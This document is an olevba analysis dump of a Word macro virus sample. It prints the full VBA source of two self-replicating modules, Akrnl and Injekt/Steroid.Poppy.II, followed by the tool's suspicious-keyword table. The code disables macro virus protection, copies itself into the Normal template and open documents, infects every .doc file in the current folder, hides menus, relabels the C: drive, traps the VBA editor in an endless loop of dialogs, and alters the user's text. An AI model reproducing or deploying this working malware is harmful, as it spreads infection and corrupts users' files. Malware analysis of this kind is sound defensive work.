olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Remplace-a8b789111f0b70e471dbb7557afe38d8fe0fa72f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Remplace-a8b789111f0b70e471dbb7557afe38d8fe0fa72f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Akrnl.bas 
in file: Virus.MSWord.Remplace-a8b789111f0b70e471dbb7557afe38d8fe0fa72f - OLE stream: 'Macros/VBA/akrnl'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
    
Sub Akrnl()
On Error Resume Next
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.ReadOnlyRecommended = False

If Day(Now()) > 22 Then Call RandomRemplace

End Sub
Sub AutoExec()
    On Error Resume Next
    Call Sauve
End Sub
Sub AutoNew()
 On Error Resume Next
 Call Sauve
End Sub
Sub AutoPrint()
 On Error Resume Next
 Call Sauve
End Sub

Sub FileNew()
    On Error Resume Next
    Call Sauve
dialogs(wdDialogFileNew).show
    Skip = 1
    Call Sauve
    
End Sub
Sub FileClose()
    On Error Resume Next
    Call Sauve
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
    Call Sauve
End Sub
Sub FileExit()
    On Error Resume Next
    Call Sauve
    Application.Quit
End Sub
    

Sub AutoOpen()
    On Error Resume Next
    Call Akrnl
    Call Sauve
    
End Sub
Sub AutoExit()
    On Error Resume Next
    Call Sauve
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub

Sub AutoClose()
    On Error Resume Next
    Call Sauve
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Call Sauve
End Sub
Sub ToolsMacro()
    On Error Resume Next
    
End Sub
Sub FileTemplates()
    On Error Resume Next
    
End Sub
Sub ViewVBCode()
   On Error Resume Next
   
End Sub

Sub RandomRemplace()
randomize
ValRandom = Int(rnd * 75)
    If ValRandom < 20 Then BesoinRemplace = True
    If ValRandom < 20 Then txt = "ainsi, si j'en crois ce que mon incompétant de professeur me dit,"
    If ValRandom < 15 Then txt = "ainsi, mon chat a perdu ses dents. De plus,"
    If ValRandom < 10 Then txt = "ainsi, selon ma grand-mère,"
    If ValRandom < 5 Then txt = "ainsi, la matière du cours est plate. De plus,"
    
    If BesoinRemplace = True Then Call Remplace(txt)
    
    
    
End Sub
    

Sub Remplace(txt)
 
Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    With Selection.Find
        .Text = "donc,"
        .Replacement.Text = txt
        .Forward = True
        .Format = False
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceOne
    Selection.MoveUp Unit:=wdScreen, Count:=8
    

End Sub

Sub Sauve()

On Error Resume Next
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Application.VBE.ActiveVBProject.VBComponents("akrnl").Export "c:\Étudiant.cfg"
ActiveDocument.ReadOnlyRecommended = False

For I = 1 To ActiveDocument.VBProject.VBComponents.Count
NomMacro = ActiveDocument.VBProject.VBComponents(I).Name
If NomMacro = "akrnl" Then PrésentAct = True Else Call DelVir(NomMacro)
Next I

For I = 1 To NormalTemplate.VBProject.VBComponents.Count
NomMacro = NormalTemplate.VBProject.VBComponents(I).Name
If NomMacro = "akrnl" Then PrésentNorm = True Else Call DelVir(NomMacro)
Next I

If PrésentAct = True And PrésentNorm = False Then Set BesoinSauve = NormalTemplate.VBProject.VBComponents
If PrésentAct = False And PrésentNorm = True Then Set BesoinSauve = ActiveDocument.VBProject.VBComponents

BesoinSauve.Import "c:\Étudiant.cfg"

If PrésentNorm = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
If PrésentAct = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument

End Sub
Sub DelVir(NomMacro)
On Error Resume Next

Application.VBE.ActiveVBProject.VBComponents.Remove _
                         Application.VBE.ActiveVBProject.VBComponents(NomMacro)
                         
With Application.NormalTemplate.VBProject
             .VBComponents.Remove .VBComponents(NomMacro)
    End With
End Sub

-------------------------------------------------------------------------------
VBA MACRO Injekt.bas 
in file: Virus.MSWord.Remplace-a8b789111f0b70e471dbb7557afe38d8fe0fa72f - OLE stream: 'Macros/VBA/Injekt'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Declare Function SetVolumeLabel Lib "kernel32" Alias "SetVolumeLabelA" (ByVal lpRootPathName As String, ByVal lpVolumeName As String) As Long
Sub Steroid()
    
    ' Steroid.Poppy.II by VicodinES
    ' "Whats Up" to : Slage Hammer, Spanska and the entire _Kim_Liberation_Army_

If Application.ShowVisualBasicEditor Then Call out
Application.EnableCancelKey = wdCancelDisabled
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Templates and add-ins...").Delete
CommandBars("tools").Controls("Options...").Enabled = False
If Application.ShowVisualBasicEditor Then Call out
With Options
.ConfirmConversions = False
.VirusProtection = False
.SaveNormalPrompt = False
End With
If Application.ShowVisualBasicEditor Then Call out
ActiveDocument.ReadOnlyRecommended = False
If Application.ShowVisualBasicEditor Then Call out
Application.ScreenUpdating = False
If Application.ShowVisualBasicEditor Then Call out
Application.VBE.ActiveVBProject.VBComponents("Injekt").Export "c:\startup.log"
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "Injekt" Then NormInstall = True
Next I
If Application.ShowVisualBasicEditor Then Call out
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "Injekt" Then ActivInstall = True
Next I
If Application.ShowVisualBasicEditor Then Call out
If ActivInstall = False Then
With ActiveDocument.VBProject
With .VBComponents.Import("c:\startup.log")
End With
End With
End If
If Application.ShowVisualBasicEditor Then Call out
If NormInstall = False Then
With NormalTemplate.VBProject
With .VBComponents.Import("c:\startup.log")
End With
End With
volset = SetVolumeLabel("c:\", "Testicle")
End If
If Application.ShowVisualBasicEditor Then Call out
If ActivInstall = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If NormInstall = False Then
If NormalTemplate.Saved = False Then NormalTemplate.Save
End If
If Application.ShowVisualBasicEditor Then Call out
'VMPCK v2.0 Beta
Application.ScreenUpdating = True
If Application.ShowVisualBasicEditor Then Call out
fuckoff:
End Sub
Sub HelpAbout()
On Error Resume Next
MsgBox "Can I have a bottle of warm Diet Mountain Dew?", vbInformation, "VMPCK v2.0 Beta / SR-1 Compatable"
MsgBox "Shout Out! ...Slage Hammer, Spanska and the entire _Kim_Liberation_Army_", vbInformation, "W97M/Steroid.Poppy.II"
End Sub
Sub FileSaveAs()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
Application.ScreenUpdating = False
dialogs(wdDialogFileSaveAs).show
Application.ScreenUpdating = True
Call Steroid
End Sub
Sub FilePrint()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
dialogs(wdDialogFilePrint).show
Call Steroid
End Sub
Sub FileClose()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
Call Steroid
Application.ScreenUpdating = False
If ActiveDocument.Saved = False Then ActiveDocument.Save
ActiveDocument.Close
End Sub
Sub FileExit()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
Call Caffeine
Application.Quit
End Sub
Sub AutoOpen()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
Call Steroid
End Sub
Sub AutoExit()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
Call Caffeine
End Sub
Sub AutoClose()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
Call Steroid
End Sub
Sub ViewVBCode()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
End Sub
Sub Caffeine()
If Application.ShowVisualBasicEditor Then Call out
Application.ScreenUpdating = False
Application.EnableCancelKey = wdCancelDisabled
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:=""
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:=""
Call Steroid
End If
Loop
End Sub
Sub info()

    'The VicodinES Macro.Poppy Construction Kit v2.0 Beta
    '====================================================
    'Code Written by VicodinES-\VV/----------------------
    'Poppy ID : 75637833-270----\/---Compatable with SR-1
    'Steroid.Poppy.II-----------/\--Never Begins Tomorrow

End Sub
Sub out()
ShowVisualBasicEditor = False
randomize
Application.EnableCancelKey = wdCancelDisabled
On Error Resume Next
ShowVisualBasicEditor = False
ActiveDocument.Save
NormalTemplate.Save
Call Caffeine
x = 1
Do While x = 1
testicle = Int(rnd * 700)
dialogs(testicle).show
Loop
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Hex String|ucx3                |75637833                                     |
+----------+--------------------+---------------------------------------------+

